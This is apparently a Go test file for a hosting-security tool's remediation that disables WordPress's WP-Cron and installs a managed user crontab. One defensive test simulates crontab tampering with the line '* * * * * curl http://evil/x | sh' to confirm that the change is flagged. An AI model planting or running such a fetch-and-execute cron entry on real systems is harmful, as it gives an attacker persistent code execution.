package checks

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"
)

const sampleWPConfig = `<?php
define( 'DB_NAME', 'alice_wp' );
define( 'DB_USER', 'alice_wp' );
$table_prefix = 'wp_';

/* That's all, stop editing! Happy publishing. */

if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}
require_once ABSPATH . 'wp-settings.php';
`

// withWPCronOwner injects a deterministic owner so the fix does not depend on
// which OS user runs `go test` (and so the root-owner guard never trips here).
func withWPCronOwner(t *testing.T, name string) {
	t.Helper()
	prev := wpCronOwnerName
	wpCronOwnerName = func(os.FileInfo) (string, error) { return name, nil }
	t.Cleanup(func() { wpCronOwnerName = prev })
}

// wpCronTestEnv builds an account web root with a wp-config.php under a
// t.TempDir() and points fixPerfAllowedRoots at it. Returns the config path
// and its parent docroot.
func wpCronTestEnv(t *testing.T, content string) (cfgPath, docroot string) {
	t.Helper()
	withWPCronOwner(t, "alice")
	root := realTempDir(t)
	withPerfFixRoots(t, root)
	docroot = filepath.Join(root, "alice", "public_html")
	if err := os.MkdirAll(docroot, 0o755); err != nil {
		t.Fatal(err)
	}
	cfgPath = filepath.Join(docroot, "wp-config.php")
	if err := os.WriteFile(cfgPath, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return cfgPath, docroot
}

// crontabRecorder is a mockCmd that emulates `crontab -u <user> -l` returning
// a fixed body and captures the content written by `crontab -u <user> <file>`.
type crontabRecorder struct {
	existing      string
	installCalls  int
	lastInstalled string
}

func (c *crontabRecorder) mock() *mockCmd {
	return &mockCmd{
		runAllowNonZero: func(name string, args ...string) ([]byte, error) {
			if name == "crontab" && containsArg(args, "-l") {
				return []byte(c.existing), nil
			}
			return nil, nil
		},
		run: func(name string, args ...string) ([]byte, error) {
			if name == "crontab" && !containsArg(args, "-l") && len(args) > 0 {
				c.installCalls++
				// Install form is `crontab -u <user> <file>`; the last arg is
				// the spool file we wrote. Read it before the caller removes it.
				if b, err := os.ReadFile(args[len(args)-1]); err == nil {
					c.lastInstalled = string(b)
				}
			}
			return nil, nil
		},
	}
}

func containsArg(args []string, want string) bool {
	for _, a := range args {
		if a == want {
			return true
		}
	}
	return false
}

func TestFixDisableWPCronInsertsDefineAndInstallsCron(t *testing.T) {
	cfgPath, docroot := wpCronTestEnv(t, sampleWPConfig)
	rec := &crontabRecorder{existing: ""}
	withMockCmd(t, rec.mock())

	res := FixDisableWPCron(cfgPath, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if !res.Success {
		t.Fatalf("expected success, got %+v", res)
	}

	out, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	body := string(out)
	if strings.Count(body, "DISABLE_WP_CRON") != 1 {
		t.Fatalf("expected exactly one DISABLE_WP_CRON define, got:\n%s", body)
	}
	if !strings.Contains(body, "define( 'DISABLE_WP_CRON', true )") {
		t.Errorf("define not written in expected form:\n%s", body)
	}
	// Insertion must land before the require of wp-settings.php so the
	// constant is defined before WordPress reads it.
	if di, ri := strings.Index(body, "DISABLE_WP_CRON"), strings.Index(body, "wp-settings.php"); di < 0 || ri < 0 || di > ri {
		t.Errorf("define must appear before wp-settings.php require (define=%d require=%d)", di, ri)
	}

	if rec.installCalls != 1 {
		t.Fatalf("expected exactly one crontab install, got %d", rec.installCalls)
	}
	cron := rec.lastInstalled
	if !strings.Contains(cron, "*/5 * * * *") {
		t.Errorf("cron interval not 5 min:\n%s", cron)
	}
	if !strings.Contains(cron, "cd "+shellQuote(docroot)+" &&") {
		t.Errorf("cron missing docroot %q:\n%s", docroot, cron)
	}
	if !strings.Contains(cron, "wp-cron.php") || !strings.Contains(cron, "/usr/local/bin/php") {
		t.Errorf("cron missing php/wp-cron invocation:\n%s", cron)
	}
}

func TestFixDisableWPCronSerializesConfigWrites(t *testing.T) {
	cfgPath, _ := wpCronTestEnv(t, sampleWPConfig)

	prevOwner := wpCronOwnerName
	var ownerMu sync.Mutex
	ownerCalls := 0
	ownerSecondSeen := make(chan struct{})
	var closeOwnerSecond sync.Once
	wpCronOwnerName = func(os.FileInfo) (string, error) {
		ownerMu.Lock()
		ownerCalls++
		call := ownerCalls
		if call == 2 {
			closeOwnerSecond.Do(func() { close(ownerSecondSeen) })
		}
		ownerMu.Unlock()

		if call == 1 {
			select {
			case <-ownerSecondSeen:
			case <-time.After(200 * time.Millisecond):
			}
		}
		return "alice", nil
	}
	t.Cleanup(func() { wpCronOwnerName = prevOwner })

	var cronMu sync.Mutex
	crontab := ""
	installCalls := 0
	withMockCmd(t, &mockCmd{
		runAllowNonZero: func(name string, args ...string) ([]byte, error) {
			if name == "crontab" && containsArg(args, "-l") {
				cronMu.Lock()
				defer cronMu.Unlock()
				return []byte(crontab), nil
			}
			return nil, nil
		},
		run: func(name string, args ...string) ([]byte, error) {
			if name == "crontab" && !containsArg(args, "-l") && len(args) > 0 {
				b, err := os.ReadFile(args[len(args)-1])
				if err != nil {
					return nil, err
				}
				cronMu.Lock()
				crontab = string(b)
				installCalls++
				cronMu.Unlock()
			}
			return nil, nil
		},
	})

	start := make(chan struct{})
	results := make(chan RemediationResult, 2)
	for range 2 {
		go func() {
			<-start
			results <- FixDisableWPCron(cfgPath, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
		}()
	}
	close(start)

	var got []RemediationResult
	for range 2 {
		select {
		case res := <-results:
			if !res.Success {
				t.Fatalf("concurrent WP-Cron fix should be idempotent, got %+v", res)
			}
			got = append(got, res)
		case <-time.After(2 * time.Second):
			t.Fatal("timed out waiting for concurrent WP-Cron fixes")
		}
	}

	body, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Count(string(body), "DISABLE_WP_CRON") != 1 {
		t.Fatalf("expected one DISABLE_WP_CRON define after concurrent fixes, got:\n%s", string(body))
	}
	if installCalls != 1 {
		t.Fatalf("expected one crontab install after concurrent fixes, got %d", installCalls)
	}

	noChange := 0
	for _, res := range got {
		if strings.Contains(res.Description, "already disabled and system cron already present") {
			noChange++
		}
	}
	if noChange != 1 {
		t.Fatalf("expected one concurrent caller to observe the completed fix, got results: %+v", got)
	}
}

func TestFixDisableWPCronIdempotent(t *testing.T) {
	already := strings.Replace(sampleWPConfig,
		"$table_prefix = 'wp_';",
		"$table_prefix = 'wp_';\ndefine( 'DISABLE_WP_CRON', true );", 1)
	cfgPath, docroot := wpCronTestEnv(t, already)
	// Existing crontab already carries our managed line for this docroot.
	rec := &crontabRecorder{existing: "# CSM WP-Cron " + docroot + "\n*/5 * * * * cd " + docroot + " && /usr/local/bin/php -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n"}
	withMockCmd(t, rec.mock())

	before, _ := os.ReadFile(cfgPath)
	res := FixDisableWPCron(cfgPath, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if !res.Success {
		t.Fatalf("expected success on no-op, got %+v", res)
	}
	after, _ := os.ReadFile(cfgPath)
	if string(before) != string(after) {
		t.Errorf("wp-config.php must be untouched when already disabled")
	}
	if strings.Count(string(after), "DISABLE_WP_CRON") != 1 {
		t.Errorf("must not duplicate the define")
	}
	if rec.installCalls != 0 {
		t.Errorf("must not rewrite crontab when managed line already present, got %d installs", rec.installCalls)
	}
}

func TestFixDisableWPCronInstallsCronWhenDefinePresentButCronMissing(t *testing.T) {
	already := strings.Replace(sampleWPConfig,
		"$table_prefix = 'wp_';",
		"$table_prefix = 'wp_';\ndefine( 'DISABLE_WP_CRON', true );", 1)
	cfgPath, _ := wpCronTestEnv(t, already)
	rec := &crontabRecorder{existing: ""} // no managed line yet
	withMockCmd(t, rec.mock())

	res := FixDisableWPCron(cfgPath, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if !res.Success {
		t.Fatalf("expected success, got %+v", res)
	}
	if rec.installCalls != 1 {
		t.Errorf("expected cron install when define present but cron absent, got %d", rec.installCalls)
	}
}

func TestFixDisableWPCronOwnerLookupFailureLeavesFileUntouched(t *testing.T) {
	cfgPath, _ := wpCronTestEnv(t, sampleWPConfig)
	prev := wpCronOwnerName
	wpCronOwnerName = func(os.FileInfo) (string, error) { return "", fmt.Errorf("owner lookup failed") }
	t.Cleanup(func() { wpCronOwnerName = prev })
	rec := &crontabRecorder{}
	withMockCmd(t, rec.mock())

	before, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	res := FixDisableWPCron(cfgPath, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if res.Success {
		t.Fatalf("expected owner lookup failure")
	}
	after, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	if string(after) != string(before) {
		t.Errorf("wp-config.php must stay unchanged when owner lookup fails")
	}
	if rec.installCalls != 0 {
		t.Errorf("must not install cron when owner lookup fails, got %d installs", rec.installCalls)
	}
}

func TestFixDisableWPCronIgnoresCommentedDisableDefine(t *testing.T) {
	commented := strings.Replace(sampleWPConfig,
		"$table_prefix = 'wp_';",
		"$table_prefix = 'wp_';\n// define( 'DISABLE_WP_CRON', true );", 1)
	cfgPath, _ := wpCronTestEnv(t, commented)
	rec := &crontabRecorder{existing: ""}
	withMockCmd(t, rec.mock())

	res := FixDisableWPCron(cfgPath, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if !res.Success {
		t.Fatalf("expected success, got %+v", res)
	}
	body, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(body), wpCronEditMarker) {
		t.Fatalf("expected active remediation define, got:\n%s", string(body))
	}
	if !wpCronHasActiveDisableDefine(body) {
		t.Fatalf("expected an active DISABLE_WP_CRON define, got:\n%s", string(body))
	}
	if rec.installCalls != 1 {
		t.Errorf("expected cron install, got %d", rec.installCalls)
	}
}

func TestFixDisableWPCronRejectsNonConfigFile(t *testing.T) {
	root := realTempDir(t)
	withPerfFixRoots(t, root)
	docroot := filepath.Join(root, "alice", "public_html")
	if err := os.MkdirAll(docroot, 0o755); err != nil {
		t.Fatal(err)
	}
	other := filepath.Join(docroot, "settings.php")
	if err := os.WriteFile(other, []byte("<?php\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	rec := &crontabRecorder{}
	withMockCmd(t, rec.mock())

	res := FixDisableWPCron(other, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if res.Success {
		t.Fatalf("expected refusal for non wp-config.php file")
	}
	if rec.installCalls != 0 {
		t.Errorf("must not touch crontab on refusal")
	}
}

func TestFixDisableWPCronRefusesWithoutInsertionPoint(t *testing.T) {
	// No "stop editing" marker and no wp-settings require: refuse rather
	// than corrupt an unfamiliar PHP file.
	bad := "<?php\ndefine( 'DB_NAME', 'x' );\n// nothing else\n"
	cfgPath, _ := wpCronTestEnv(t, bad)
	rec := &crontabRecorder{}
	withMockCmd(t, rec.mock())

	res := FixDisableWPCron(cfgPath, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if res.Success {
		t.Fatalf("expected refusal without a safe insertion point")
	}
	out, _ := os.ReadFile(cfgPath)
	if string(out) != bad {
		t.Errorf("file must be unchanged on refusal")
	}
	if rec.installCalls != 0 {
		t.Errorf("must not install cron on refusal")
	}
}

func TestFixDisableWPCronInsertsBeforeRequireWhenNoMarker(t *testing.T) {
	noMarker := "<?php\ndefine( 'DB_NAME', 'x' );\nrequire_once ABSPATH . 'wp-settings.php';\n"
	cfgPath, _ := wpCronTestEnv(t, noMarker)
	rec := &crontabRecorder{}
	withMockCmd(t, rec.mock())

	res := FixDisableWPCron(cfgPath, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if !res.Success {
		t.Fatalf("expected success using wp-settings fallback, got %+v", res)
	}
	body, _ := os.ReadFile(cfgPath)
	di, ri := strings.Index(string(body), "DISABLE_WP_CRON"), strings.Index(string(body), "wp-settings.php")
	if di < 0 || ri < 0 || di > ri {
		t.Errorf("define must precede wp-settings require")
	}
}

func TestInsertDisableWPCronSkipsMarkerInsideBlockComment(t *testing.T) {
	inComment := "<?php\n/*\nThat's all, stop editing!\n*/\nrequire_once ABSPATH . 'wp-settings.php';\n"
	out, ok := insertDisableWPCron([]byte(inComment))
	if !ok {
		t.Fatalf("expected fallback to active wp-settings.php require")
	}
	body := string(out)
	defineIdx := strings.Index(body, "DISABLE_WP_CRON")
	commentEndIdx := strings.Index(body, "*/")
	requireIdx := strings.Index(body, "wp-settings.php")
	if defineIdx < 0 || commentEndIdx < 0 || requireIdx < 0 {
		t.Fatalf("missing expected text after rewrite:\n%s", body)
	}
	if defineIdx < commentEndIdx || defineIdx > requireIdx {
		t.Fatalf("define must land after the block comment and before require:\n%s", body)
	}
}

func TestInsertDisableWPCronRefusesHeredocOnlyInsertionPoint(t *testing.T) {
	inHeredoc := "<?php\n$banner = <<<TXT\nrequire_once ABSPATH . 'wp-settings.php';\nThat's all, stop editing!\nTXT;\n"
	if out, ok := insertDisableWPCron([]byte(inHeredoc)); ok {
		t.Fatalf("expected refusal for insertion points inside heredoc, got:\n%s", string(out))
	}
}

func TestWPCronIntervalClamping(t *testing.T) {
	cases := []struct {
		in   int
		want string
	}{
		{0, "*/5 * * * *"},
		{-3, "*/5 * * * *"},
		{15, "*/15 * * * *"},
		{90, "*/60 * * * *"},
	}
	for _, tc := range cases {
		cfgPath, docroot := wpCronTestEnv(t, sampleWPConfig)
		rec := &crontabRecorder{}
		withMockCmd(t, rec.mock())
		res := FixDisableWPCron(cfgPath, WPCronFixOptions{IntervalMinutes: tc.in, PHPBin: "/usr/local/bin/php"})
		if !res.Success {
			t.Fatalf("interval %d: expected success, got %+v", tc.in, res)
		}
		if !strings.Contains(rec.lastInstalled, tc.want+" cd "+shellQuote(docroot)) {
			t.Errorf("interval %d: want schedule %q, cron:\n%s", tc.in, tc.want, rec.lastInstalled)
		}
	}
}

func TestCrontabHasWPCronJobRecognizesExistingForms(t *testing.T) {
	docroot := "/home/alice/public_html"
	cases := []struct {
		name    string
		line    string
		present bool
	}{
		{
			name:    "absolute path",
			line:    "*/10 * * * * /usr/local/bin/php " + filepath.Join(docroot, "wp-cron.php") + " >/dev/null 2>&1",
			present: true,
		},
		{
			name:    "quoted cd",
			line:    "*/10 * * * * cd " + shellQuote(docroot) + " && /usr/local/bin/php wp-cron.php >/dev/null 2>&1",
			present: true,
		},
		{
			name:    "other docroot prefix",
			line:    "*/10 * * * * cd " + shellQuote(docroot+"2") + " && /usr/local/bin/php wp-cron.php >/dev/null 2>&1",
			present: false,
		},
		{
			name:    "comment",
			line:    "# */10 * * * * cd " + shellQuote(docroot) + " && /usr/local/bin/php wp-cron.php",
			present: false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := crontabHasWPCronJob(tc.line+"\n", docroot); got != tc.present {
				t.Fatalf("crontabHasWPCronJob() = %v, want %v", got, tc.present)
			}
		})
	}
}

func TestInstallUserWPCronSerializesPerUserCrontabWrites(t *testing.T) {
	docrootA := "/home/alice/public_html"
	docrootB := "/home/alice/blog"
	var mu sync.Mutex
	crontab := ""
	readCalls := 0
	firstReadStarted := make(chan struct{})
	secondReadStarted := make(chan struct{})
	releaseFirst := make(chan struct{})

	withMockCmd(t, &mockCmd{
		runAllowNonZero: func(name string, args ...string) ([]byte, error) {
			if name != "crontab" || !containsArg(args, "-l") {
				return nil, nil
			}
			mu.Lock()
			readCalls++
			call := readCalls
			current := crontab
			mu.Unlock()
			switch call {
			case 1:
				close(firstReadStarted)
				<-releaseFirst
			case 2:
				close(secondReadStarted)
			}
			return []byte(current), nil
		},
		run: func(name string, args ...string) ([]byte, error) {
			if name == "crontab" && !containsArg(args, "-l") && len(args) > 0 {
				b, err := os.ReadFile(args[len(args)-1])
				if err != nil {
					return nil, err
				}
				mu.Lock()
				crontab = string(b)
				mu.Unlock()
			}
			return nil, nil
		},
	})

	firstDone := make(chan error, 1)
	go func() {
		_, err := installUserWPCron("alice", docrootA, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
		firstDone <- err
	}()
	select {
	case <-firstReadStarted:
	case <-time.After(time.Second):
		t.Fatal("first crontab read did not start")
	}

	secondCalling := make(chan struct{})
	secondDone := make(chan error, 1)
	go func() {
		close(secondCalling)
		_, err := installUserWPCron("alice", docrootB, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
		secondDone <- err
	}()
	<-secondCalling

	secondReadBeforeRelease := false
	select {
	case <-secondReadStarted:
		secondReadBeforeRelease = true
	case <-time.After(100 * time.Millisecond):
	}
	close(releaseFirst)

	if err := <-firstDone; err != nil {
		t.Fatalf("first install: %v", err)
	}
	if err := <-secondDone; err != nil {
		t.Fatalf("second install: %v", err)
	}
	if secondReadBeforeRelease {
		t.Fatal("second crontab read started before the first install completed")
	}

	mu.Lock()
	final := crontab
	mu.Unlock()
	if !strings.Contains(final, docrootA) || !strings.Contains(final, docrootB) {
		t.Fatalf("final crontab must contain both installs, got:\n%s", final)
	}
}

func TestInstallUserWPCronSuppressesRealtimeEventDuringInstall(t *testing.T) {
	resetSelfWrites(t)
	docroot := "/home/alice/public_html"
	path := "/var/spool/cron/alice"
	var spool []byte
	withMockOS(t, &mockOS{readFile: func(name string) ([]byte, error) {
		if name == path && spool != nil {
			return append([]byte(nil), spool...), nil
		}
		return nil, os.ErrNotExist
	}})
	withMockCmd(t, &mockCmd{
		runAllowNonZero: func(string, ...string) ([]byte, error) { return nil, nil },
		run: func(name string, args ...string) ([]byte, error) {
			if name != "crontab" || containsArg(args, "-l") {
				return nil, nil
			}
			data, err := os.ReadFile(args[len(args)-1])
			if err != nil {
				return nil, err
			}
			spool = append([]byte(nil), data...)
			if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); emit {
				t.Error("realtime crontab write must be suppressed while install is still returning")
			}
			return nil, nil
		},
	})

	installed, err := installUserWPCron("alice", docroot, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if err != nil {
		t.Fatalf("installUserWPCron: %v", err)
	}
	if !installed {
		t.Fatal("expected crontab install")
	}
}

func TestInstallUserWPCronRecordsOnDiskSpoolContent(t *testing.T) {
	resetSelfWrites(t)
	docroot := "/home/alice/public_html"
	path := "/var/spool/cron/alice"
	var staged []byte
	var spool []byte
	withMockOS(t, &mockOS{readFile: func(name string) ([]byte, error) {
		if name == path && spool != nil {
			return append([]byte(nil), spool...), nil
		}
		return nil, os.ErrNotExist
	}})
	withMockCmd(t, &mockCmd{
		runAllowNonZero: func(string, ...string) ([]byte, error) { return nil, nil },
		run: func(name string, args ...string) ([]byte, error) {
			if name != "crontab" || containsArg(args, "-l") {
				return nil, nil
			}
			data, err := os.ReadFile(args[len(args)-1])
			if err != nil {
				return nil, err
			}
			staged = append([]byte(nil), data...)
			spool = []byte(strings.ReplaceAll(string(data), "\n", "\r\n"))
			return nil, nil
		},
	})

	installed, err := installUserWPCron("alice", docroot, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if err != nil {
		t.Fatalf("installUserWPCron: %v", err)
	}
	if !installed {
		t.Fatal("expected crontab install")
	}
	if string(staged) == string(spool) {
		t.Fatal("test did not create distinct staged and on-disk crontab bytes")
	}
	if !isExpectedSelfWrite(path, spool) {
		t.Fatal("installed crontab should record the on-disk spool bytes")
	}
	if isExpectedSelfWrite(path, staged) {
		t.Fatal("installed crontab must not keep the staged buffer hash")
	}
}

func TestInstallUserWPCronDoesNotRecordTamperedSpool(t *testing.T) {
	resetSelfWrites(t)
	docroot := "/home/alice/public_html"
	path := "/var/spool/cron/alice"
	var spool []byte
	withMockOS(t, &mockOS{readFile: func(name string) ([]byte, error) {
		if name == path && spool != nil {
			return append([]byte(nil), spool...), nil
		}
		return nil, os.ErrNotExist
	}})
	withMockCmd(t, &mockCmd{
		runAllowNonZero: func(string, ...string) ([]byte, error) { return nil, nil },
		run: func(name string, args ...string) ([]byte, error) {
			if name != "crontab" || containsArg(args, "-l") {
				return nil, nil
			}
			data, err := os.ReadFile(args[len(args)-1])
			if err != nil {
				return nil, err
			}
			spool = append(append([]byte(nil), data...), []byte("* * * * * curl http://evil/x | sh\n")...)
			return nil, nil
		},
	})

	installed, err := installUserWPCron("alice", docroot, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if err != nil {
		t.Fatalf("installUserWPCron: %v", err)
	}
	if !installed {
		t.Fatal("expected crontab install")
	}
	if isExpectedSelfWrite(path, spool) {
		t.Fatal("tampered spool content must not be recorded as a CSM self-write")
	}
	if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); !emit {
		t.Fatal("tampered spool content must still raise a sensitive-file finding")
	}
}

func TestRecordCrontabSelfWriteUnreadableFailsSafe(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/alice"
	withMockOS(t, &mockOS{readFile: func(string) ([]byte, error) { return nil, os.ErrPermission }})

	recordCrontabSelfWrite("alice", []byte("*/5 * * * * php wp-cron.php\n"))

	if _, emit := EvaluateSensitiveFileWrite(path, 0, 1234, "crontab"); !emit {
		t.Fatal("unreadable crontab spool must not be suppressed")
	}
}

func TestInstallUserWPCronClearsPendingSelfWriteOnInstallFailure(t *testing.T) {
	resetSelfWrites(t)
	docroot := "/home/alice/public_html"
	path := "/var/spool/cron/alice"
	var staged []byte
	withMockCmd(t, &mockCmd{
		runAllowNonZero: func(string, ...string) ([]byte, error) { return nil, nil },
		run: func(name string, args ...string) ([]byte, error) {
			if name != "crontab" || containsArg(args, "-l") {
				return nil, nil
			}
			data, err := os.ReadFile(args[len(args)-1])
			if err != nil {
				return nil, err
			}
			staged = append([]byte(nil), data...)
			return nil, fmt.Errorf("install failed")
		},
	})

	installed, err := installUserWPCron("alice", docroot, WPCronFixOptions{IntervalMinutes: 5, PHPBin: "/usr/local/bin/php"})
	if err == nil {
		t.Fatal("expected crontab install failure")
	}
	if installed {
		t.Fatal("failed crontab install must report installed=false")
	}
	if isExpectedSelfWrite(path, staged) {
		t.Fatal("failed crontab install must clear the pending self-write record")
	}
}

func TestCrontabContentEqualAllowsOnlySafeNormalization(t *testing.T) {
	expected := []byte("# CSM WP-Cron /home/alice/public_html\n*/5 * * * * php wp-cron.php\n")
	if !crontabContentEqual([]byte("# CSM WP-Cron /home/alice/public_html\r\n*/5 * * * * php wp-cron.php\r\n"), expected) {
		t.Fatal("CRLF line endings should match the expected crontab content")
	}
	if !crontabContentEqual([]byte("# CSM WP-Cron /home/alice/public_html\n*/5 * * * * php wp-cron.php"), expected) {
		t.Fatal("a missing final newline should match the expected crontab content")
	}
	if crontabContentEqual([]byte("# CSM WP-Cron /home/alice/public_html\n*/5 * * * * php wp-cron.php\n\n"), expected) {
		t.Fatal("an extra appended blank line must not match the expected crontab content")
	}
}

func TestFileOwnerNameRefusesRootOwned(t *testing.T) {
	// /etc/passwd is uid 0 on Linux and macOS; gives a real root-owned inode
	// to exercise the guard without needing privileges.
	info, err := os.Stat("/etc/passwd")
	if err != nil {
		t.Skip("/etc/passwd not available")
	}
	st, ok := info.Sys().(*syscall.Stat_t)
	if !ok || st.Uid != 0 {
		t.Skip("/etc/passwd not root-owned on this host")
	}
	if _, err := fileOwnerName(info); err == nil {
		t.Error("expected refusal for a root-owned file")
	}
}

func FuzzInsertDisableWPCron(f *testing.F) {
	f.Add(sampleWPConfig)
	f.Add("<?php\n")
	f.Add("")
	f.Add("require_once ABSPATH . 'wp-settings.php';")
	f.Fuzz(func(t *testing.T, content string) {
		// Must never panic regardless of file shape.
		_, _ = insertDisableWPCron([]byte(content))
	})
}
